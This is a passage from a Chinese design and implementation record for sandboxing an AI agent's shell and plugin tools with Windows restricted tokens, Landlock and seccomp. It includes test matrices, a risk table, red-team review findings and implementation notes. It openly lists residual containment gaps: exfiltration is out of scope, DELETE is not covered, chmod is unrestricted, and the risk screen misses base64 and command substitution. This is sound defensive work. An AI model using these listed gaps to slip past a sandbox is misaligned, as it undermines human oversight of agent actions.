| Linux enforce 档 32 位 ELF 尝试 | arch 校验 ERRNO（BPF 首指令验收） |
| poison 档 `curl`（走代理语义的程序） | 撞黑洞代理；**node 内置 fetch 照常**（失效名单验收） |
| open 档 `npm ping` / `cargo search` | 成功（回归不破坏） |
| 令牌 / landlock 建立失败注入（含 ABI1 平台 TRUNCATE 误入 handled set） | 执行段失败 + 原因透传（fail-closed） |
| 探测缺失 + `require_os=false` | degraded + 裸跑 + 黄标 |
| **模型循环重试**：连拒同因沙箱拒绝 | 回合收敛（max_steps 内）、事件可观测、文案指引生效 |
| 老内核（无 Landlock）首次 Deny | 错误信息直接指路 `require_os=false` |

### 8.2 兼容回归

- 现有 353 测试基线不破（含 fs 围栏原测试、`\\?\` 已知红测试维持原状）；
- 插件改道后原插件测试全绿 + **schema 兼容断言**（外壳 `{service,plugin,kind,...}` 不变）+ cwd/超时/截断按 §6.1 对照表断言；
- WorkspaceWrite 真实工作流冒烟（Windows + Linux 各一轮）：npm install（缓存 env 重定向后）、cargo build、git commit（走 git 工具）；
- ABI 1 平台（22.04 GA 5.15）跑一轮记录降级清单（npm install 断 = 预期内记录，不修）。

### 8.3 性能

- 稳态单次包装 < 50ms（测试内 Instant 断言或 criterion 基准，跑法已定）；Landlock 规则建立 < 10ms；
- **首次 ACL 传播为分钟级一次性成本**（大仓库 + 杀软敏感，记档不设预算）；pre_exec 导致的 fork+exec 回退开销实测记档；
- 令牌 / ruleset 按 profile 缓存 + 失效重建。

---

## 九、风险与取舍（v1.1 扩充）

| 风险 | 评级 | 缓解 / 登记口径 |
| --- | --- | --- |
| **ACL 自动传播**：大仓库分钟级一次性 + 杀软敏感 + no-DACL 子对象传播变空 DACL 全拒 + SE_DACL_PROTECTED 不传播 | 中 | SANDBOX_SID 安装期持久化（避免累积重传播）；传播前补 DACL；残余登记 + 探测用例兜底 |
| **老内核 / FAT 卷**（require_os=true 默认下 shell 整档拒 / 写围栏失效） | 中 | Deny 文案直接指路逃生门；卷类型探测进启动健康报告；产品影响如实告知 |
| **误伤面**：HKCU 写、包管理器缓存、%TEMP%、ABI1 跨目录移动、enforce 档 DNS/localhost、NNP 下 ping/mount | 中 | §4.3 / §5.1 / §5.4 逐项登记 + 冒烟矩阵覆盖 |
| 供应链投毒残余（放行缓存目录时） | 中 | 默认 env 重定向零放行；`extra_write_roots` 显式选择并记录 |
| **exfiltration 面与本方案无关**（全盘可读 + 网络 open） | 中 | §1.3 显式声明 + §4.8 deny-read 可选加固（opt-in，主进程同受限的副作用明示） |
| **元数据不受 Landlock 管**（chmod/chown DoS 级） | 低 | 登记残余，不在本方案范围 |
| 命令风险屏漏报（base64/命令替换/脚本内嵌） | 低 | §3.5 漏报清单写死 + UI 文案不冒充 |
| poison 档失效名单（node fetch/Java/.NET） | 低 | §3.4 如实声明，poison 不当防线宣传 |
| 受限令牌与句柄/桌面交互边角（lpDesktop、句柄继承） | 中 | §4.6 显式设计（不再当假设）+ 首验收冒烟 |
| 令牌/规则缓存状态污染（桌面单机，无集群红线问题） | 低 | 按 profile 缓存 + 失效重建 |

---

## 十、决策记录

### 已拍板（2026-09-14 用户拍板：按推荐定案）

1. **shell 网络默认档 = `open`**：现状不变；`poison` / `enforce` 为 opt-in 严格档（enforce 仅 Linux，Windows 配置即拒绝 + 提示，见 §3.4）。
2. **`sandbox.require_os` 默认 = `true`**：fail-closed 字面义；老环境确需逃生时用户自行切 `false`（降级必带黄标 + degraded 标记）。
3. **`.git` deny ACE = 做，仅挂 shell 令牌 profile**：deny mask 排除 SYNCHRONIZE/READ_CONTROL（§4.5）；git 工具走无 deny 的第二套 profile。
4. **排期 = S0 先行，S1/S2 维持绑 M3**：S1 拆 S1a/S1b（§七），Windows 主线 2–2.5 周；用户后续指令可提前。

### 新增待拍板（红蓝审查发现，D5）

5. **D5：插件 `requires_approval → high_risk` 映射是否在 OS 沙箱就绪后改掉**：
   - 现状（§6.5）：写类插件在 WorkspaceWrite 下审批前硬拦（到不了执行段、不走审批卡），OS 沙箱受益面仅自声明只读的插件；
   - 选项 A（**推荐**）：改为「沙箱内放行 + Always 审批」——写类插件进入受限令牌内执行，人审闸保留，OS 沙箱兑现插件面受益（需连带评估 connectors 同款注释场景）；
   - 选项 B：维持现状映射，文档明示受益边界（插件面 OS 沙箱增益有限）。

---

## 十一、红蓝审查记录（2026-09-14 · 一轮 · 三路红队 → 亲核 → 回填）

**方法**：拍板写入后，三路红队并行只读对抗审查（Windows 技术面 / Linux 技术面 / 架构一致性），发现 43 条（P0×12 / P1×17 / P2×14）；主代理逐条亲核（代码取证 + MSDN / landlock.7 / tokio / codex 源码事实核查），去重合并后约 30 条成立，全部回填本 v1.1。

**亲核要点**（关键证据）：

- 插件 `high_risk: self.requires_approval`（`cmx-agent-plugin/src/lib.rs` guard()）+ 守卫注册序 Sandbox→HighRisk→Approval（`builder.rs:192`）+ `connectors.rs:213/272/337` 三处注释自证「HighRiskGuard 会在 WorkspaceWrite 沙箱下于审批前硬拦」→ C-7 成立，引出 D5；
- `proc.rs:20-22`（DEFAULT 30s / MAX 120s / 64KB）、`windows-sys 0.59`（tools Cargo.toml:24）、IM `TurnPolicyOverride::FULL_ACCESS`（agent.rs:59、im/lib.rs:113）→ C-6/C-14/C-9 成立；
- codex `windows-sandbox-rs` token.rs（DISABLE_MAX_PRIVILEGE | LUA_TOKEN | WRITE_RESTRICTED、DisableSidCount=0、restricting 集合含 Logon/Everyone、permissive default DACL 注释）、allow.rs（`includes_tmp_env_vars`）、acl.rs（deny mask 含 FILE_GENERIC_WRITE——照抄即连读拒，§4.5 反向规避）→ A-2/A-3/A-1/A-7 成立；
- codex `linux-sandbox` landlock.rs（硬编码 `/dev/null` RW、`AccessFs::from_all(abi)` + BestEffort、io_uring 全模式禁、NNP）→ B-1/B-2/B-5 成立；
- landlock.7（挂载层级语义、ABI 矩阵、REFER ABI2 / TRUNCATE ABI3、NNP 前置、chmod 不受限、exec 后仍生效不可逆）、seccomp(2)（per-thread、NNP）、io_uring_enter(2)（SOCKET 5.19+ / CONNECT 5.5+）→ B 组 P0 全成立；
- std CommandExt 官方文档（无 CreateProcessAsUserW 等价）→ A-5/C-5 spawn 重写成立。

**误报修正（2 处，判据记录）**：

1. C-5「CreateProcessAsUserW 需 SeAssignPrimaryTokenPrivilege、普通桌面用户跑不通」——与红 A 对 codex 源码核实冲突（codex unelevated 产线即用 AsUserW 派生自令牌；MSDN 对自派生受限令牌有豁免语义）。判：**倾向误报**，但降级为 S1a 首验收项（普通桌面用户 spawn 冒烟），翻车退 broker 进程形态——不作为方案性错误。
2. A-2「机制描述错误」——`WRITE_RESTRICTED + restricting SID` 路线本身无误（与 codex 一致），错的是 v1.0 §4.1 括号里的措辞（「剥写权限的 SID 只保留 deny-only」会误导实施者走 DisableSids 歧路）。判：**措辞错误成立、路线无误**，已按准确表述重写。

**回填落点**：§1.3（chrome/IM/exfiltration 边界）、§2.2（AppContainer 否决理由、域名白名单不承接）、§3.3（探测姿势修正）、§3.4（不管什么列 + poison 失效名单 + io_uring）、§3.5（漏报清单）、§四（4.1–4.8 全章重写）、§五（5.1–5.4 全章重写）、§六（6.1–6.5 重写）、§七（S1 拆期 + Linux 跑道 + windows-sys）、§八（12 类新用例）、§九（风险表扩充）、§十（D5）。

**结论**：v1.0 的三处地基缺陷（Windows 放行集自相矛盾、Linux 规则矩阵与 ABI 缺失、「core 不动」与事件通道矛盾）全部修正；红队总体判断「不能按 v1.0 实施、可按修订版实施」与本记录一致。**一轮通过，无需第二轮**；实施期 S1a 首验收项（AsUserW 冒烟）与 TMP/缓存盘点为最高风险锚点。

---

## 十二、实施记录（2026-09-15，S0-S3 全阶段完成）

**验证数字**：全仓 cargo test **420+ 通过 / 1 已知红**（`\?\` workspace 断言，基线即红）/ 0 新增失败（沙箱新增 19 测全绿：Windows 受限 spawn 端到端、逃逸写拒、.git 双 profile、HKCU、越界读、超时整树收尸、BPF 形状等）；全仓 **clippy --all-targets 零告警**（Windows host + WSL Ubuntu 双侧）；e2e-serve.sh **7/7**；Linux 侧 WSL cargo check/clippy 通过（Landlock/seccomp 运行时验证 = WSL/Deepin 真机跑道，缺口记档）。

**实施落点**：新 crate `cmx-agent-sandbox`（14 号 crate，windows-sys 0.59 + libc）；tools（proc.rs run_profiled + shell/git/run_tests 改道）、plugin（command/wasm 改道 + manifest working_dir/timeout_ms + **D5 落地**：high_risk 映射退役改「沙箱内放行 + Always 审批」）、app（SandboxSettings 落 data_dir/settings.json + Get/SetSandboxSettings 前门命令 + CmdRiskGuard 注册）、web/ui（工具卡沙箱徽标含孤儿卡路径，--muted/--gold 令牌零硬编码）+ AGENTS.md 同步。

**实施中实测踩坑（真实锚点）**：CREATE_UNICODE_ENVIRONMENT 缺失 → GLE 87；环境块必须按名字母序排序 → GLE 87；TOKEN_ASSIGN_PRIMARY 必须 OpenProcessToken 时带上 → GLE 5；lpApplicationName 传裸名不做 PATH 搜索 → GLE 2；**PROC_THREAD_ATTRIBUTE_JOB = 0x2_000D（JOB_LIST=13，非 19）** → GLE 24；hStdInput 传 INVALID_HANDLE_VALUE → 不可用。

**实施阶段红蓝审查（一轮三路）清偿记录**：红队 Windows/集成/Linux 三路报 **3 P0 + 8 P1 + 约 15 P2**，全部亲核后：P0 全修（spawn 属性表 value 悬垂 UB→函数级作用域+JOB_LIST 勘正；seccomp JEQ 操作码 0x10→0x15+断言锚；env 87 系问题已在实施期修）；P1 修 6（quote_arg 2n 反斜杠、属性表/Job 不可用 fail-closed 拒绝（连带揭穿旧兜底路径全表句柄继承泄漏——旧测试实际走的是兜底路径）、cwd 校验前置防句柄泄漏、Degraded 路径 net_applied:false 如实标注、FAT 卷×require_os=false 逃生门打通（[vol]/[acl]/[token] 错误分类降级）、Linux 缓存 env 重定向平台中立）；P2 修 8（extra_write_roots 防线校验、seccomp 过滤器父进程预建零分配、run_tests 纳入风险屏、wasm denied 透传、孤儿卡徽标、setpgid 父侧、path_to_cstring OsStrExt、settings persisted 标记、卷探测全集、vars_os、NUL 拒绝）。**登记残余（如实声明，不假装生效）**：DELETE 不在 write-restricted 第二道检查覆盖内（删除围栏靠 S3 风险屏+审计；测试钉住边界）；no-DACL 子对象传播陷印与 SE_DACL_PROTECTED 不传播；LUA_TOKEN 未加（elevated 运行时读/exec 保留管理员组）；ACL 缓存无外部失效复核（重置后须重启进程）；Linux `.git` deny 未实现（Landlock 无减法语义）；Landlock 元数据（chmod/chown）不受限；hardened_read 字段预留未实现。

**D5 处置**：按推荐选项 A 实施并验证（插件 WorkspaceWrite 下走 Always 审批卡后进受限令牌执行；connectors 同款场景核实为 in-process HTTP 工具不涉进程沙箱，维持现状）。

**未竟事项**：Landlock/seccomp 真机行为验证（WSL check/clippy 已过，curl/io_uring/32 位 ELF 三例 + npm/cargo 重定向回归待真机跑）；elevated 运行场景回归；no-DACL 传播负例自动用例。

---

## 附：参考

- OpenAI Codex Windows 沙箱工程博客：https://openai.com/index/building-codex-windows-sandbox/ ；`codex-rs/windows-sandbox-rs`（Apache-2.0：token.rs / process.rs / acl.rs / allow.rs / desktop.rs / deny_read_acl.rs）；`codex-rs/linux-sandbox`（landlock.rs / seccomp）
- Landlock：kernel.org `landlock.7`（ABI 矩阵、挂载层级、NNP、CAVEATS）；glibc 2.36 起提供 wrapper
- MSDN：CreateRestrictedToken / Restricted Tokens（双检查语义）/ Automatic Propagation（传播陷阱）/ File Security and Access Rights（GENERIC_WRITE 隐含 SYNCHRONIZE / 非 NTFS）/ AppContainer Isolation
- tokio：`process::Command::pre_exec`（unsafe / async-signal-safety / posix_spawn 回退）
- 0908 调研 §4/§5.4/5.5（Windows 沙箱生态、P2 拍板、不做清单）；0904 §八（隔离层与四档沙箱——域名白名单档不承接的声明见 §2.2）
